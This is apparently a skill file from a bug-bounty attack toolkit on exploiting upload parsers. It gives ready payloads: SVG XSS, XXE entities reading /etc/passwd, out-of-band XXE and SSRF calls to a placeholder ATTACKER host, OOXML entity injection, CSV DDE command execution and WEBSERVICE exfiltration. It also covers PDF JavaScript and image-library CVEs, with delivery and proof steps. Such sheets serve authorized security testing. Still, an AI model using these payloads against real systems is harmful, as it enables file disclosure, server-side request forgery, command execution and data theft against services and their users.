---
name: attack-upload-doc-xml
description: "Upload document parser attacks — SVG XSS/XXE, OOXML (docx/xlsx) XXE, PDF JS, CSV injection, image library CVEs"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - file-upload
  - xxe
  - svg
  - ooxml
  - csv-injection
tech_stack:
  - web
cwe_ids:
  - CWE-434
  - CWE-611
chains_with:
  - attack-file-upload
  - attack-xxe
  - attack-xss-stored
prerequisites:
  - attack-file-upload
---

# Upload Document-Parser Attacks

## Objective

The uploaded file is PARSED (avatar convert, doc preview, spreadsheet import, thumbnail
generation). Parser bugs turn the upload into XXE, XSS, SSRF, or formula injection —
regardless of extension checks.

## Methodology

### 1. SVG (renders as image — the best target)

```xml
<!-- Stored XSS: renders on any <img src=...svg> consumer -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
<!-- XXE inside SVG: external entity file read / OOB -->
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
<!-- OOB XXE (parameter entity) -->
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % remote SYSTEM "http://ATTACKER/xxe.dtd">%remote;]>
<svg xmlns="http://www.w3.org/2000/svg"/>
<!-- SSRF via external image href (parser fetches it) -->
<svg><image href="http://ATTACKER:8888/svg-ssrf"/></svg>
```

### 2. OOXML (docx/xlsx/pptx = zip of XML)

```bash
# Unzip → edit [Content_Types].xml / .rels / any XML → inject DOCTYPE+entity → rezip
# XXE in document.xml.rels (external target fetch):
<!DOCTYPE r [<!ENTITY x SYSTEM "http://ATTACKER:8888/ooxml-ssrf">]>
# Convert with libreoffice/python-docx to keep structure valid
# xlsx: formula injection too (=WEBSERVICE("http://ATTACKER")) → cell exfil + SSRF
```

### 3. CSV import (server parses the file)

```csv
=cmd|' /C calc'!A0        (Windows DDE)
=WEBSERVICE("http://ATTACKER")   (Excel/Sheets SSRF)
@SUM(1+9)*cmd|' /C id'!A0   (formula chain)
```

### 4. PDF

- Embedded `/JavaScript` triggers on VIEW (client-side) — need the app to serve/preview
- PDF generators (wkhtmltopdf, headless chrome) — local file include in the SOURCE URL
  of html-to-pdf converters (pair attack-ssrf-classic `file://`)

### 5. Image libraries (check version fingerprints)

```text
ImageMagick <7.0.8-55 → ImageTragick (https://portswigger.net/research) — mvg/msl delete/copy
libwebp CVE-2023-4863 (webp) — memory corruption via crafted webp
ghostscript -dSAFER escapes — crafted postscript in jpg/png wrappers
```

## Proof

- XXE: file content echoed in the conversion/preview response, or OOB fetch in your log
- SVG XSS: render the served SVG URL in a browser — execution screenshot
- CSV: imported cell executes formula → output in the app's response/export
- Name the PARSER (exiftool/libreoffice/...) — triage needs the vulnerable component

## Notes

- Feed parser attacks THROUGH the normal preview flow, not direct URL — the bug is the
  parser's handling of the file, and many parsers never run on direct fetch
